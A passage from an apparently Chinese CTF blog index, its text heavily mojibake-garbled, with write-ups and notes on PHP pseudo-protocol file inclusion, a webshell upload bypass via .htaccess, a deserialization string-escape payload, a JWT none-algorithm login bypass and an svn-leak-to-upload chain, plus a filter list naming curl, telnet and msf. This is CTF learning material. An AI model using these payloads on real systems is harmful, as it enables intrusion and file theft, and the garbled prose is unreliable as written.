å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1261059946.png"></p><h4 id="7-fileå‡½æ•°"><a href="#7-fileå‡½æ•°" class="headerlink" title="7.fileå‡½æ•°"></a>7.fileå‡½æ•°</h4><p>file() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­ã€‚ä¸ file_get_contents() ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ file() å°†æ–‡ä»¶ä½œä¸ºä¸€ä¸ªæ•°ç»„è¿”å›ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå•å…ƒéƒ½æ˜¯æ–‡ä»¶ä¸­ç›¸åº”çš„ä¸€è¡Œï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4273189012.png"></p><h4 id="8-fopenå‡½æ•°"><a href="#8-fopenå‡½æ•°" class="headerlink" title="8.fopenå‡½æ•°"></a>8.fopenå‡½æ•°</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/263460922.png"></p><h4 id="9-readfileå‡½æ•°"><a href="#9-readfileå‡½æ•°" class="headerlink" title="9.readfileå‡½æ•°"></a>9.readfileå‡½æ•°</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1474575383.png"></p><h2 id="ä¸‰ã€phpä¼ªåè®®"><a href="#ä¸‰ã€phpä¼ªåè®®" class="headerlink" title="ä¸‰ã€phpä¼ªåè®®"></a>ä¸‰ã€phpä¼ªåè®®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;input,ç”¨äºæ‰§è¡Œphpä»£ç ï¼Œéœ€è¦postè¯·æ±‚æäº¤æ•°æ®ã€‚</span><br><span class="line">php:&#x2F;&#x2F;filter,ç”¨äºè¯»å–æºç ï¼Œgetæäº¤å‚æ•°ã€‚?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64&#x2F;resource&#x3D;xxx.php</span><br><span class="line">éœ€è¦å¼€å¯allow_url_fopen:php:&#x2F;&#x2F;inputã€php:&#x2F;&#x2F;stdinã€php:&#x2F;&#x2F;memoryã€php:&#x2F;&#x2F;temp</span><br><span class="line">ä¸éœ€è¦å¼€å¯allow_url_fopen:php:&#x2F;&#x2F;filter</span><br><span class="line">åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php:&#x2F;&#x2F;filterå’Œphp:&#x2F;&#x2F;input</span><br><span class="line">php:&#x2F;&#x2F;filterç”¨äºè¯»å–æºç ï¼Œphp:&#x2F;&#x2F;inputç”¨äºæ‰§è¡Œphpä»£ç </span><br><span class="line">php:&#x2F;&#x2F;inputéœ€è¦postè¯·æ±‚æäº¤æ•°æ®</span><br></pre></td></tr></table></figure><p>php://filterå¯ä»¥getæäº¤?a=php://filter/read=convert.base64-encode/resource=xxx.php</p><h2 id="å››ã€dataåè®®"><a href="#å››ã€dataåè®®" class="headerlink" title="å››ã€dataåè®®"></a>å››ã€dataåè®®</h2><p>ç”¨æ³•ï¼š<br>data://text/plain,xxxx(è¦æ‰§è¡Œçš„phpä»£ç )<br>data://text/plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)<br>ä¾‹ï¼š<br>?page=data://text/plain,<br>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p><h2 id="äº”ã€fileåè®®"><a href="#äº”ã€fileåè®®" class="headerlink" title="äº”ã€fileåè®®"></a>äº”ã€fileåè®®</h2><p>ç”¨æ³•ï¼š<br>file://[æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„ç»å¯¹è·¯å¾„]</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¼ªåè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯é’é¾™ç»„ 2020</title>
      <link href="2020/05/11/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/"/>
      <url>2020/05/11/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto-you-raise-me-up"><a href="#Crypto-you-raise-me-up" class="headerlink" title="Crypto_you raise me up"></a>Crypto_you raise me up</h2><p><a href="https://pan.baidu.com/s/16iCD8XuDzeqdxYC2KZy_og"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šcvblï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/196336223.png"></p><p>æ­¤é¢˜è€ƒå¯Ÿç¦»æ•£å¯¹æ•°ï¼Œc=m^flag%n<br>ç»å¤§ä½¬æŒ‡ç‚¹ï¼Œå»ç™¾åº¦<a href="https://blog.csdn.net/hefenghhhh/article/details/88812174"><strong>bsgs</strong></a><br>çœ‹æ‡‚ä¹‹åå°±å¯ä»¥å†™è„šæœ¬äº†<br>å…ˆç”¨sageæ±‚ä¸ªå€¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1802325346.png"></p><p>æœ€ç»ˆå¾—åˆ°åº•ä¸‹çš„Xå€¼<br>æ¥ç€pythonè¿è¡Œä¸€æ³¢å°±å¯ä»¥å¾—åˆ°flag<br>é™„ä¸Špythonè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">-*- coding: utf-<span class="number">8</span> -*-</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">   x=<span class="number">56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757</span></span><br><span class="line">y=long_to_bytes(x)</span><br><span class="line">print(y)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2945124590.png"></p><p>å¦‚æœåœ¨kaliä¸­å³å¯ç›´æ¥è¿è¡Œå¾—flagï¼Œå¦åˆ™éœ€è¦ä¾é <a href="https://pan.baidu.com/s/1bIiICAdaEEW-6IzQkXLiuw"><strong>sage</strong></a>ï¼ˆæå–ç ï¼šcbgyï¼‰</p><h2 id="Crypto-boom"><a href="#Crypto-boom" class="headerlink" title="Crypto_boom"></a>Crypto_boom</h2><p><a href="https://pan.baidu.com/s/1ZA_vid0tbtPkCUsGTE-4Ew"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šcacgï¼‰</p><p>è¿™é¢˜å°±æ˜¯éœ€è¦é€šå…³ï¼ˆä¸€å…±ä¸‰å…³ï¼‰ï¼Œéœ€è¦åœ¨IDAæ‰“å¼€<br>ç¬¬ä¸€å…³ï¼ˆmd5ï¼‰ï¼šåœ¨çº¿è§£å¾—ï¼šen5oy</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/524062950.png"></p><p>ç¬¬äºŒå…³ï¼šè§£å¾—ï¼šx=74;y=68;z=31</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2893839265.png"></p><p>ç¬¬ä¸‰å…³ï¼šè§£å¾—ï¼šx=89127561</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/538577641.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/375266408.png"></p><p>æœ€åé€šå…³å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3783353063.png"></p><p>è¿™é‡Œè®¡ç®—å…¨æ˜¯sageå¾—åˆ°çš„ï¼Œå¼ºçƒˆæ¨èsageï¼Œè¿˜ä¸é”™å“¦ï¼Œé“¾æ¥å°±åœ¨å‰é¢<br>ä¸è¿‡çŒ›ç”·éƒ½ç›´æ¥ç¡¬ç®—â‰¥ â‰¤</p><blockquote><p>è®°å½•ä¸€ä¸‹ç¬¬ä¸€æ¬¡ä»¥åŠ å¯†é€‰æ‰‹å‡ºé“</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘é¼æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF 2020</title>
      <link href="2020/05/05/2020De1CTF/"/>
      <url>2020/05/05/2020De1CTF/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Check-in"><a href="#Web-Check-in" class="headerlink" title="Web_Check in"></a>Web_Check in</h2><p>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!<br>å½“è¿‡æ»¤å†…å®¹ph,å’Œ&gt;<br>ä¸Šä¼ çš„phpå›¾ç‰‡æœ¨é©¬ç”¨çŸ­æ–‡ä»¶ç»•è¿‡,<br>&lt;?=system(â€˜lsâ€™);<br>ä¸Šä¼ çš„.htaccesså¯ä»¥è¿™æ ·å†™<br>AddType application/x-httpd-p<br>hp .jpg<br>ç”¨.htaccessçš„â€™â€™æ¢è¡Œç¬¦,è¿›è¡Œæ¢è¡Œ<br>æŠ›å¼€æ­¤é¢˜çš„autoè¿‡æ»¤ä¹Ÿå¯ä»¥ä½¿ç”¨.user.iniæ–¹å¼</p><h2 id="Misc-å¤§æ‚çƒ©"><a href="#Misc-å¤§æ‚çƒ©" class="headerlink" title="Misc_å¤§æ‚çƒ©"></a>Misc_å¤§æ‚çƒ©</h2><p>åˆ†ææµé‡åŒ…ï¼Œè¿‡æ»¤http(æœ¬é¢˜ä¸ºå›¾ç‰‡ï¼Œ6å¼ jpgï¼Œ1å¼ png)</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/855756509.png"></p><p>è¿‡æ»¤å‡ºhttpçš„åŒ…ä¹‹åï¼Œè°ƒä¸€ä¸‹æ’åºæ–¹å¼ï¼Œå°±ä¼šæ›´æ¸…æ¥šçš„çœ‹åˆ°é‚£å‡ ä¸ªæœ‰å›¾ç‰‡çš„æ•°æ®ï¼Œç„¶åé€ä¸ªæå–</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2214000637.png"></p><p>æå–å‡ºçš„jpgå›¾ç‰‡éƒ½æ˜¯æ— ç”¨çš„å¹²æ‰°ä¿¡æ¯ã€‚pngå›¾ç‰‡é‡Œæœ‰ä¸€ä¸ªé“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1707100713.png"></p><p>ç„¶åè®¿é—®é“¾æ¥ï¼Œæ˜¯ä¸€ä¸ªwordæ–‡ä»¶ã€‚ä¸‹è½½ä¸‹æ¥ï¼Œbinwalk -e æ–‡ä»¶å è¿›è¡Œåˆ†ç¦»ã€‚ç”±äºé™„ä»¶æ˜¯åœ¨è°·æ­Œäº‘ç›˜ï¼Œæ‰€ä»¥éœ€è¦æŒ‚æ¢¯å­ä¸‹è½½</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4111015375.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1579435868.png"></p><p>åˆ†ç†å‡ºçš„æ–‡ä»¶å¤¹æ‰“å¼€ä¼šæœ‰ä¸€ä¸ªzipçš„å‹ç¼©åŒ…ï¼Œæ‹¿å‡ºæ¥çˆ†ç ´ã€‚æˆ–è€…åœ¨kalié‡Œé¢çˆ†ç ´ä¹Ÿè¡Œã€‚å› ä¸ºå®˜æ–¹æç¤ºæ˜¯6ä½æ•°çš„å¯†ç ï¼Œå‰ä¸¤ä½æ˜¯DEï¼Œå¹¶ä¸”è¯´äº†è¿™æ˜¯ä¸ªçˆ†ç ´é¢˜</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/766053067.png"></p><p>çˆ†ç ´å¾—å‡ºå¯†ç ï¼šDE34Q1</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/362851059.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3617853187.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3309077275.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/439026996.png"></p><h3 id="æ³¨æ„ç‚¹ï¼š"><a href="#æ³¨æ„ç‚¹ï¼š" class="headerlink" title="æ³¨æ„ç‚¹ï¼š"></a>æ³¨æ„ç‚¹ï¼š</h3><blockquote><p>1.è¿™é‡Œçš„å‹ç¼©åŒ…ä¸è¦è§£å‹ï¼Œè§£å‹å‡ºæ¥flagçš„txtæ–‡ä»¶ä¼šæ¶ˆå¤±<br>2.ä½¿ç”¨2345å‹ç¼©å·¥å…·flagä¹Ÿä¼šæ¶ˆå¤±</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/921677107.png"></p><p>æœ€åå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1951972321.png"></p><blockquote><p>è¿™æ¬¡æ¯”èµ›æ‚é¡¹é¢˜ç»„ä¸­åšå‡ºæ¥çš„è¿˜æœ‰ä¸¤é“é¢˜(ç­¾åˆ°)ï¼Œéœ€è¦ç§‘å­¦ä¸Šç½‘</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> De1CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTFå››æœˆæ˜¥å­£æˆ˜ 2020</title>
      <link href="2020/04/24/2020DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E6%88%98/"/>
      <url>2020/04/24/2020DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc-Blueshark"><a href="#Misc-Blueshark" class="headerlink" title="Misc-Blueshark"></a>Misc-Blueshark</h2><p>è¿™é¢˜è€ƒå¯Ÿè“ç‰™åè®®<br>é¦–å…ˆè¦äº†è§£ä¸€ä¸‹OBEXè¿™ä¸ªåè®®<br><a href="https://baike.baidu.com/item/OBEX%E5%8D%8F%E8%AE%AE/15748372?fr=aladdin">https://baike.baidu.com/item/OBEX%E5%8D%8F%E8%AE%AE/15748372?fr=aladdin</a><br>æ¥ç€ç”¨wiresharkæ‰“å¼€ä¸‹è½½å¥½çš„æ–‡ä»¶ï¼Œå¼€å§‹è¡¨æ¼”ï¼š<br>æ¥åˆ°ç¬¬383è¡Œï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1362613773.png"></p><p>ç„¶åçœ‹è§info what_you_want.7zçŸ¥é“åº”è¯¥æ˜¯è¦æŠŠä¸‹è½½ä¸‹æ¥çš„pcapngè§£å‹<br>OBEXè¦åœ¨wiresharké‡Œé¢è¿‡æ»¤<br>è§£å‹éœ€è¦å¯†ç ï¼Œå†å›è¿‡å¤´çœ‹383è¡ŒOBRXåè®®é‡Œé¢çš„å†…å®¹<br>ç„¶åçœ‹è§password_is_bluetooth pin.txt<br>å°±çŸ¥é“è§£å‹å¯†ç æ˜¯pin.txt<br>ç„¶åå†å»æµé‡é‡Œé¢æ‰¾infoä¸ºpinçš„<br>å°±ä¼šçœ‹è§è§£å‹å¯†ç ä¸º141854</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/970665866.png"></p><p>æœ€åå°±å°†å…¶è§£å‹ï¼Œæ‰“å¼€æ–‡æ¡£è·å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2687703523.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3589340154.png"></p><h2 id="Web-unserialize"><a href="#Web-unserialize" class="headerlink" title="Web-unserialize"></a>Web-unserialize</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $a;</span><br><span class="line">        $this-&gt;password &#x3D; $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $b &#x3D; &#39;gqy&#39;;</span><br><span class="line">    function __destruct()&#123;   </span><br><span class="line">        $c &#x3D; &#39;a&#39;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">   public $c;</span><br><span class="line">   function __toString()&#123;</span><br><span class="line">   &#x2F;&#x2F;flag.php</span><br><span class="line">       echo file_get_contents($this-&gt;c);</span><br><span class="line">       return &#39;nice&#39;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">echo read(write(serialize($a)));</span><br><span class="line">&#x2F;&#x2F;çœç•¥äº†å­˜å‚¨åºåˆ—åŒ–æ•°æ®çš„è¿‡ç¨‹,ä¸‹é¢æ˜¯å–å‡ºæ¥å¹¶ååºåˆ—åŒ–çš„æ“ä½œ</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br><span class="line">echo &#39;&lt;br&gt;&#39;.$b-&gt;password;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çŒœæµ‹æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<br>è¿™é‡Œæœ‰ä¸ªå°é—®é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . â€˜*â€™ . chr(0), â€˜\0\0\0â€™, $data);</span><br><span class="line">&#125;</span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(â€˜\0\0\0â€™, chr(0) . â€˜*â€™ . chr(0), $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>000è½¬æ¢ä½chr(0).*.chr(0)è¿™é‡Œ,ä¼šå¯¼è‡´å­—ç¬¦ä¸²é€ƒé€¸<br>å…·ä½“<a href="https://www.php.cn/php-weizijiaocheng-437066.html">ç‚¹æˆ‘</a><br>æœ€åæ„é€ å‡ºä»¥ä¸‹payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;c&quot;;s: 8:&quot;password&quot;;O: 1:&quot;B&quot;: 1:&#123;s: 1:&quot;b&quot;;O: 1:&quot;C&quot;: 1:&#123;s: 1:&quot;c&quot;;s: 8:&quot;flag.php&quot;;&#125;a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;c&quot;;s: 8:&quot;password&quot;;O: 1:&quot;B&quot;: 1:&#123;s: 1:&quot;b&quot;;O: 1:&quot;C&quot;: 1:&#123;s: 1:&quot;c&quot;;s: 8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è™ç¬¦CTF 2020</title>
      <link href="2020/04/24/2020%E8%99%8E%E7%AC%A6CTF/"/>
      <url>2020/04/24/2020%E8%99%8E%E7%AC%A6CTF/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Easylogin"><a href="#Web-Easylogin" class="headerlink" title="Web-Easylogin"></a>Web-Easylogin</h2><h4 id="buuctfå¤ç°å…¥å£"><a href="#buuctfå¤ç°å…¥å£" class="headerlink" title="buuctfå¤ç°å…¥å£"></a><a href="https://buuoj.cn/challenges#[HFCTF2020]EasyLogin"><strong>buuctfå¤ç°å…¥å£</strong></a></h4><p>ä¸€çœ‹è¿™ä¸ªé¢˜å°±çŸ¥é“æ˜¯ç”¨adminç™»é™†ï¼Œä¸ä¿¡ä½ å°±æ³¨å†Œadminè´¦å·è¯•è¯•ã€‚ï¼ˆå‘ç°æ³¨å†Œä¸äº†ï¼Œå°±è‚¯<br>å®šæ˜¯ç”¨adminè´¦å·ç™»é™†æ‹¿flagï¼‰<br>1.è¯ä¸å¤šè¯´å…ˆä¸Šå›¾</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/378118769.png"></p><p>å…ˆæ³¨å†Œçœ‹çœ‹ï¼Œç„¶åå‘ç° tokenã€‚é‚£æˆ‘ä»¬å°±æŠŠ token é‡Œé¢çš„ä¸œè¥¿æ˜¾ç¤ºå‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1312150754.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/817220210.png"></p><p>å‘ç°åŠ å¯†æ˜¯HS256ã€‚ç„¶åæˆ‘çœ‹äº†å¤§ä½¬çš„wpï¼ˆç”¨noneæ¥ç»•è¿‡hs256,æœ€åæˆ‘ä¼šæŠŠ<br>å¤§ä½¬çš„wpæ”¾å‡ºæ¥ã€‚ï¼‰å†çœ‹secretid:1ï¼ŒæŠŠ1å˜æˆ[ ]ï¼ˆç©ºæ•°ç»„å³å¯ç»•è¿‡ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/447516078.png"></p><p>æ‹¿åˆ° cookie å°±å®Œäº‹ã€‚æœ€åä¸€æ­¥ç”¨åŸå§‹çš„å·å»æ‹¿ flagï¼Œç„¶åæ›¿æ¢ cookie</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4254027831.png"></p><blockquote><p>å‚è€ƒèµµå¸ˆå‚…çš„wpï¼š<a href="https://www.zhaoj.in/read-6512.html">https://www.zhaoj.in/read-6512.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è™ç¬¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Iæ˜¥ç§‹ç»ƒä¹ é¢˜</title>
      <link href="2020/04/11/I%E6%98%A5%E7%A7%8B%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
      <url>2020/04/11/I%E6%98%A5%E7%A7%8B%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="web-upload"><a href="#web-upload" class="headerlink" title="web-upload"></a>web-upload</h2><p>é¡µé¢æ‰“å¼€æ˜¾ç¤ºä¸‹å›¾ï¼š<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2688224292.png"></p><p>æŸ¥çœ‹æºä»£ç æ²¡å•¥å‘ç°ã€‚ã€‚ã€‚<br>burpæŠ“åŒ…ï¼Œå‘ç°å“åº”å¤´æœ‰flagå€¼çš„å­—ç¬¦ä¸²</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2740139262.png"></p><p>bese64è§£ç ï¼š<img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1608162908.png"></p><p>å†æ¬¡base64è§£ç ï¼Œå¾—åˆ°ä¸€ç»„æ•°å€¼ï¼Œæºä»£ç æç¤ºå°†å¾—åˆ°çš„å†…å®¹POST</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/832980815.png"></p><p>è¿”å›æ–°çš„å“åº”å¤´flagå€¼ï¼Œå†™ä¸ªè„šæœ¬è·‘çœ‹çœ‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;9e05cc717ffc4e4da52b8203470cdf6f6fca6fdb7574432a.changame.ichunqiu.com&#x2F;&quot;</span><br><span class="line">url_a &#x3D; requests.session()</span><br><span class="line">a &#x3D; url_a.get(url).headers[&#39;FLAG&#39;]</span><br><span class="line">key_a &#x3D; base64.b64decode(a)</span><br><span class="line">key &#x3D; str(key_a).split(&#39;:&#39;)</span><br><span class="line">key &#x3D; key[1][1:-1]</span><br><span class="line">key &#x3D; base64.b64decode(key)</span><br><span class="line">data &#x3D; &#123;&quot;ichunqiu&quot;:key&#125;</span><br><span class="line">get &#x3D; url_a.post(url,data &#x3D; data)</span><br><span class="line">print(get.text)</span><br></pre></td></tr></table></figure><p>è·‘å‡ºæ¥ä¸€ä¸ªè·¯å¾„</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2436058800.png"></p><p>ç‚¹å‡»æŒ‰é’®è¿›å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1717428112.png"></p><p>é€šè¿‡æ‰«æç›®å½•å‘ç°æœ‰/.svnç›®å½•æç¤º403<br>svnæ³„éœ²å¾—åˆ°/.svn/wc.db</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1691234355.png"></p><p>md5è§£ç ï¼Œç”¨å¾—åˆ°çš„md5(8638d5263ab0d3face193725c23ce095)è¿›è¡Œç™»å½•ï¼Œå¯†ç éšä¾¿å¡«<br>ä¸‹é¢æ˜¯éªŒè¯ç md5è„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import hashlib</span><br><span class="line">import itertools as its</span><br><span class="line">words &#x3D; &quot;1234568790abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">r &#x3D; its.product(words, repeat&#x3D;5)</span><br><span class="line">for i in r:</span><br><span class="line"> a &#x3D; &quot;&quot;.join(i)</span><br><span class="line"> md5 &#x3D; hashlib.md5(a.encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line"> if(md5[0:6] &#x3D;&#x3D; &#39;aa2cec&#39;):</span><br><span class="line">  print a</span><br><span class="line">  break</span><br></pre></td></tr></table></figure><p>æç¤ºæ–°é¡µé¢<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2567870452.png"></p><p>æ–‡ä»¶ä¸Šä¼ ã€‚ã€‚ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3602213636.png"></p><p>phpã€php3ã€php4ã€php5ã€php7ã€phtã€phtmlã€phps èƒ½è¢«è§£æçš„åç¼€<br>ä¸€ä¸ªä¸ªè¯•è¿‡å»å‘ç°phtèƒ½è¢«è§£æ<br>burpæ”¹åŒ…å¾—åˆ°flag</p><blockquote><p>å‚è€ƒï¼š<a 